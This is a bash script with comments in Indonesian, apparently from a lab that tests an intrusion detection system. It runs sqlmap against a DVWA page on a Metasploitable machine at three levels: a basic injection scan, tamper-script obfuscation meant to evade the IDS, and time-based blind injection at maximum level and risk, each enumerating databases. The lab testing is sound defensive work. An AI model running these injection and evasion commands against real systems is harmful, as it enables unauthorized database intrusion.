#!/bin/bash

# =================================================================
# MODUL 04: SQL INJECTION (SQLMAP)
# Strategi: 3 Level Depth (Basic, Obfuscation, Time-Based)
# Target URL: DVWA (SQL Injection Page)
# =================================================================

# KONFIGURASI TARGET
TARGET_IP="192.168.1.XXX"   # Ganti dengan IP Metasploitable
# URL DVWA SQL Injection (Pastikan ID user ada, misal id=1)
TARGET_URL="http://$TARGET_IP/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit"

# PENTING: Ganti string ini dengan Cookie sesi login DVWA Anda!
# Cara dapat: Login DVWA -> F12 -> Storage -> Cookies -> PHPSESSID
COOKIE="security=low; PHPSESSID=ganti_dengan_session_id_anda"

LOG_FILE="logs/sqli_session_$(date +%F).log"

# Warna untuk Tampilan Laporan
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m' # No Color

echo "[+] [04_SQLMAP] Memulai Modul SQL Injection..."
echo "[+] Target: $TARGET_URL"
echo "[+] Waktu Mulai: $(date)"


# Cek apakah Cookie sudah diganti?
# FIX: Menambahkan spasi setelah [[ dan sebelum ]] agar tidak error syntax
if [[ "$COOKIE" == *"ganti_dengan"* ]]; then
    echo -e "${RED}[!] WARNING: Anda belum mengganti PHPSESSID di script!${NC}"
    echo -e "${RED}[!] Script mungkin gagal login ke DVWA.${NC}"
    sleep 3
fi

# -----------------------------------------------------------------
# LEVEL 1: NOISY / CLASSIC SQL INJECTION
# Tujuan: Menguji deteksi signature dasar (misal: ' OR 1=1).
# Teknik: --batch (otomatis jawab Y), tanpa teknik penyembunyian.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running Basic SQL Injection (--batch)...${NC}"

# Simpan command ke variabel (Menggunakan escape quote \" agar URL/Cookie aman)
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --batch --dbs"

# Tampilkan Command ke Layar
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command (Menggunakan eval karena ada karakter khusus di URL/Cookie)
eval $CMD > logs/sqlmap_lvl1.txt 2>&1
echo "    -> Selesai. (Harapan: Alert ET WEB_SERVER SQL Injection)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: EVASION / TAMPER SCRIPT
# Tujuan: Mengelabui IDS dengan mengacak payload (Obfuscation).
# Teknik: Menggunakan --tamper (space2comment, randomcase).
#         Contoh: 'UNION SELECT' menjadi 'UNIoN/**/SeLeCT'.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running Tamper Evasion (--tamper space2comment)...${NC}"

# Simpan Command
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --batch --tamper=space2comment,randomcase --dbs"

# Tampilkan Command
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
eval $CMD > logs/sqlmap_lvl2.txt 2>&1
echo "    -> Selesai. (Harapan: False Negative / Alert 'Evasion')"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: TIME-BASED BLIND & HIGH RISK
# Tujuan: Menguji deteksi anomali waktu (bukan signature text).
# Teknik: --technique=T (Time-Based). Payload membuat database 'tidur'.
#         --level=5 --risk=3 (Mengirim payload sangat banyak & berbahaya).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Time-Based Blind (--technique=T --level=5)...${NC}"

# Simpan Command
CMD="sqlmap -u \"$TARGET_URL\" --cookie=\"$COOKIE\" --batch --technique=T --level=5 --risk=3 --dbs"

# Tampilkan Command
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Eksekusi Command
eval $CMD > logs/sqlmap_lvl3.txt 2>&1
echo "    -> Selesai. (Harapan: Deteksi via flow/timeout analysis)"

echo "[+] [04_SQLMAP] Modul Selesai pada $(date)"
echo "-----------------------------------------------------------"